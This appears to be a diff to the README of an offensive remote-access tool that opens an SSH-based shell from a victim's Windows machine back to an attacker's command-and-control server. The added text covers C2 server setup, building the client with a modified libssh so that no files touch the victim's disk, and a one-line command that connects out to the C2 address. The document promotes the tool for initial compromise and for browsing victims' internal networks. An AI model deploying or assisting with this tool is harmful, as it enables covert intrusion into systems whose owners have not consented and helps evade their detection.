@@ -8,6 +8,7 @@ Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.mic
 This tool can be used as a fast initial compromise tool that can be used not only as a shell but also to browse the internal network of the victim. 
 
 ## Setup instructions
+### C2 server
 We need to properly configure the SSH server running at the C2 so we don't get hacked.
 
 Run all of this as root
@@ -32,3 +33,23 @@ Allow blank passwords for SSH sessions of anonymous in `/etc/ssh/sshd_config`:
 
 Restart sshd:
 ```systemctl restart ssh```
+
+### Client
+Compiling the client is somehow tricky because `libssh` (the library we use to handle SSH communications) does not support creating a SSH server using certificates from memory but they need to exist in disk. Since we are 3l373 hackers we don't want to drop any file to disk so I modified the `libssh` code. 
+
+You can find the modified code [here](https://github.com/illera88/libssh_mod) or getting the prebuilt libraries [here](https://github.com/illera88/PrecompiledLibraries/tree/master/windows/libssh_mod)
+
+To compile it just make sure you add the includes and libraries for:
+- libssh_mod 
+- zlib
+- openssl
+
+You can find all of them already prebuilt for Windows [here](https://github.com/illera88/PrecompiledLibraries/).
+
+
+## Using it
+It's very easy: 
+
+```
+SSHIUU.exe 192.168.15.135
+```
